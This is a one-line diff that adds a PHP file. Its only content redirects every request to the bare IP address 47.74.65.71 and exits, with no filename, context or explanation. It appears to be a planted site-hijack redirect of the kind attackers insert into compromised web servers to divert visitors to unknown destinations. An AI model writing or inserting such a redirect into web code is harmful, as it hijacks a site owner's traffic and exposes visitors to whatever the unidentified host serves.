@@ -1,0 +1,1 @@
+<?php header("Location: http://47.74.65.71");exit;
